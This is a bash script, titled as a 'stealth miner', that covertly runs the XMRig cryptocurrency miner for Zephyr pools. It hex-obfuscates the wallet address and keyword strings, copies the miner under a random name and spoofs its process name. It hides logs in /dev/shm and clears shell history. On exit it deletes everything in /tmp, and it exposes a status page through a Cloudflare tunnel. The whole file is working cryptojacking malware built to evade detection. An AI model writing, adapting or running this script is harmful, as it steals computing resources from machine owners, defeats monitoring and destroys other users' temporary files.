#!/bin/bash
# ================================================================
#  SELF‑CONTAINED STEALTH MINER – FIXED DOWNLOAD & CP ERRORS
#  (No sudo, no compilation, all random spoofs)
# ================================================================
set -e

# ---- Pure Bash hex decoder ----
_HX() {
    local hex="$1"
    local bytes=""
    for ((i=0; i<${#hex}; i+=2)); do
        bytes+="\\x${hex:$i:2}"
    done
    printf "$bytes"
}

# ---- Random generators ----
_RAND_STR() { head -c 12 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c $((8 + RANDOM % 5)); }
_RAND_NUM() { echo $((RANDOM % 1000 + 1)); }
_RAND_CPU() { echo $((50 + RANDOM % 41)); }

# ---- Core config ----
_WALLET=$(_HX "5a45504859523258656946416b704a48346379615a5946505965376f6e7939744a5069474b4d6f77467a3163565534637a77525a72537670356131637a6a514d45553164584457396f4b6b374e4b3344694a38724e67784e5a524c4c4d7171384c693458653359")

_POOLS=(
    "stratum+tcp://zeph.2miners.com:2222"
    "stratum+tcp://zephyrpool.com:5555"
    "stratum+tcp://zeph.hashvault.pro:5555"
    "stratum+tcp://zephyr.herominers.com:1122"
)
_POOL=${_POOLS[$RANDOM % ${#_POOLS[@]}]}

_CPULIM=$(_RAND_CPU)
_PRINT_TIME=$((30 + RANDOM % 91))

# ---- All spoofs random (no xxd) ----
_WBASE=$(od -An -tx2 -N2 /dev/urandom | tr -d ' ')
_SUFFIX=$(od -An -tx2 -N6 /dev/urandom | tr -d ' ' | head -c 6)
_WORKER="${_WBASE}-${_SUFFIX}"

_BIN_NAME="$(_RAND_STR)"
_FAKE_BIN="/tmp/${_BIN_NAME}"

_PROC_NAME="$(_RAND_STR)"
_SPOOF="[${_PROC_NAME}]"

_RAND_DIR=".cache-$(_RAND_STR)"
_LOG_DIR="/dev/shm/${_RAND_DIR}"
mkdir -p "$_LOG_DIR"
_LOG="${_LOG_DIR}/.log-$(_RAND_STR).tmp"
_PID="/tmp/.pid-$(_RAND_STR).lock"
_TPID="/tmp/.tpid-$(_RAND_STR).lock"
_TPORT=$((8000 + RANDOM % 3000))
_CFG="/tmp/config-$(_RAND_STR).json"

# ---- Scrub traces ----
_scrub() {
    history -c 2>/dev/null
    cat /dev/null > ~/.bash_history 2>/dev/null
    unset HISTFILE
    rm -rf /tmp/* 2>/dev/null || true
}
trap '_scrub ; exit' EXIT

# ---- Download XMRig static binary ----
_download_xmrig() {
    # Remove any directory named xmrig
    [ -d "./xmrig" ] && rm -rf "./xmrig"
    # Check if we already have a binary file
    if [ -f "./xmrig" ] && [ -x "./xmrig" ]; then
        echo "✅ Found existing xmrig binary."
        return 0
    fi

    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64)  XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" ;;
        aarch64) XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz" ;;
        *) echo "⚠️ Unsupported architecture: $ARCH"; return 1 ;;
    esac

    if command -v curl &>/dev/null; then
        DL_CMD="curl -L"
    elif command -v wget &>/dev/null; then
        DL_CMD="wget -O-"
    else
        echo "⚠️ No curl/wget found."
        return 1
    fi

    echo "📥 Downloading static XMRig for $ARCH..."
    # Download and extract to a temp directory
    TMP_DIR=$(mktemp -d)
    $DL_CMD "$XMRIG_URL" | tar -xz -C "$TMP_DIR" 2>/dev/null
    # Find the binary inside the extracted folder
    BIN_FILE=$(find "$TMP_DIR" -name "xmrig" -type f | head -1)
    if [ -z "$BIN_FILE" ]; then
        echo "❌ Binary not found in archive."
        rm -rf "$TMP_DIR"
        return 1
    fi
    # Copy to current directory as ./xmrig
    cp "$BIN_FILE" ./xmrig
    chmod +x ./xmrig
    rm -rf "$TMP_DIR"
    echo "✅ XMRig binary ready."
    return 0
}

# ---- Obtain binary ----
_download_xmrig || {
    echo "❌ Could not obtain XMRig. Exiting."
    exit 1
}

# ---- Use the binary ----
_BIN="./xmrig"
cp "$_BIN" "$_FAKE_BIN"   # copy to random fake path
chmod +x "$_FAKE_BIN"

# ---- Generate config ----
printf '{
    "cpu": { "enabled": true, "max-threads-hint": %s, "huge-pages": false, "yield": true, "priority": 0 },
    "pools": [ { "url": "%s", "user": "%s.%s", "pass": "x", "keepalive": true, "tls": false } ],
    "print-time": %s,
    "verbose": false
}\n' "$_CPULIM" "$_POOL" "$_WALLET" "$_WORKER" "$_PRINT_TIME" > "$_CFG"

# ---- Launch miner ----
_BANWORDS=$(_HX "72656a65637420696e76616c696420646973636f6e6e656374206572726f72")
_ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))

(
    exec -a "$_SPOOF" "$_FAKE_BIN" --config="$_CFG" --no-color >> "$_LOG" 2>&1 &
    _MPID=$!
    echo $_MPID > "$_PID"

    tail -f "$_LOG" | while read line; do
        for kw in "${_ARR[@]}"; do
            if [[ "$line" =~ $kw ]]; then
                kill $_MPID 2>/dev/null
                exit 1
            fi
        done
    done &
    wait $_MPID 2>/dev/null
    exit 0
) &

# ---- Optional Cloudflare Tunnel ----
if command -v cloudflared &>/dev/null && command -v python3 &>/dev/null; then
    _STATUS_DIR="/tmp/status-$(_RAND_STR)"
    mkdir -p "$_STATUS_DIR"
    (
        while true; do
            printf '<pre>%s<br>Worker: %s<br>%s</pre>' "$(date)" "$_WORKER" "$(tail -20 $_LOG | sed 's/$/<br>/')" > "$_STATUS_DIR/index.html"
            sleep 15
        done
    ) &
    nohup python3 -m http.server $_TPORT --directory "$_STATUS_DIR" >/dev/null 2>&1 &
    if ! command -v cloudflared &>/dev/null; then
        echo "⚠️ cloudflared not found; downloading..."
        curl -L -o /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
        chmod +x /tmp/cloudflared
        _CL=/tmp/cloudflared
    else
        _CL=$(which cloudflared)
    fi
    nohup $_CL tunnel --url http://localhost:$_TPORT > /tmp/tunnel-$(_RAND_STR).log 2>&1 &
    echo $! > "$_TPID"
    sleep 5
    _TURL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel-*.log | head -1)
else
    echo "⚠️ Cloudflare Tunnel disabled: missing python3 or cloudflared."
fi

# ---- Final status ----
clear
printf "\n============================================================\n"
printf "✅ RANDOMISED STEALTH MINER ACTIVE\n"
printf "   - Worker: %s\n" "$_WORKER"
printf "   - Process spoof: %s\n" "$_SPOOF"
printf "   - Binary: %s (random name)\n" "$_FAKE_BIN"
printf "   - Log: %s (hidden in /dev/shm)\n" "$_LOG"
printf "   - CPU limit: %s%%\n" "$_CPULIM"
[ -n "$_TURL" ] && printf "   - Monitor: %s (port %s)\n" "$_TURL" "$_TPORT"
printf "   - Watchdog: ON\n"
printf "============================================================\n"
printf "View logs: tail -f %s\n" "$_LOG"
printf "Stop: pkill -f %s ; pkill -f cloudflared\n" "$_BIN_NAME"
printf "============================================================\n"

# ---- Keep alive ----
while true; do sleep 3600; done &
wait $(cat "$_PID" 2>/dev/null) 2>/dev/null
sleep infinity
